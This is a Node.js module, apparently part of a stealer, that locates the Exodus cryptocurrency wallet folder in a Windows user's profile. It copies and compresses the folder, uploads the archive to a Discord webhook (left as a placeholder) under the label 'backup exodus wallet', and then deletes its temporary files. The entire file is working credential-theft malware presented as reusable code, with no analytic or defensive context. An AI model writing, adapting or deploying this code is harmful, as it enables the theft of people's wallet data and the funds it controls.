const fs = require('fs')
const path = require('path')
const os = require('os')
const axios = require('axios')
const FormData = require('form-data')
const { execSync } = require('child_process')

const usuario = os.homedir()
const webhook = 'webhook here'

function copy_pasta(origem, destino) {
  if (!fs.existsSync(destino)) fs.mkdirSync(destino, { recursive: true })
  for (const item of fs.readdirSync(origem)) {
    const origem_item = path.join(origem, item)
    const destino_item = path.join(destino, item)
    if (fs.lstatSync(origem_item).isDirectory()) {
      copy_pasta(origem_item, destino_item)
    } else {
      try { fs.copyFileSync(origem_item, destino_item) } catch {}
    }
  }
}

function limpa_pasta(pasta) {
  if (!fs.existsSync(pasta)) return
  for (const item of fs.readdirSync(pasta)) {
    const caminho = path.join(pasta, item)
    if (fs.lstatSync(caminho).isDirectory()) {
      limpa_pasta(caminho)
      fs.rmdirSync(caminho)
    } else {
      fs.unlinkSync(caminho)
    }
  }
}

async function exodus() {
  const exodus_pasta = path.join(usuario, 'AppData', 'Roaming', 'Exodus')
  const temp_pasta = path.join(usuario, 'AppData', 'Local', 'Temp', 'Exodus')
  const temp_zip = path.join(usuario, 'AppData', 'Local', 'Temp', 'Exodus.zip')

  if (!fs.existsSync(exodus_pasta)) return

  copy_pasta(exodus_pasta, temp_pasta)  
  try {
    execSync(`tar -zcf "${temp_zip}" -C "${temp_pasta}" .`)
  } catch { return }

  const form = new FormData()
  form.append('file', fs.createReadStream(temp_zip), 'Exodus.zip')
  form.append('payload_json', JSON.stringify({
    embeds: [{
      title: 'Exodus File',
      description: 'backup exodus wallet',
      color: 0x242424,
      footer: { text: 'discord.gg/npm' }
    }]
  }))

  try {
    await axios.post(webhook, form, { headers: form.getHeaders() })
  } catch {}

  try {
    if (fs.existsSync(temp_zip)) fs.unlinkSync(temp_zip)
    if (fs.existsSync(temp_pasta)) {
      limpa_pasta(temp_pasta)
      fs.rmdirSync(temp_pasta)
    }
  } catch {}
}

module.exports = { exodus }
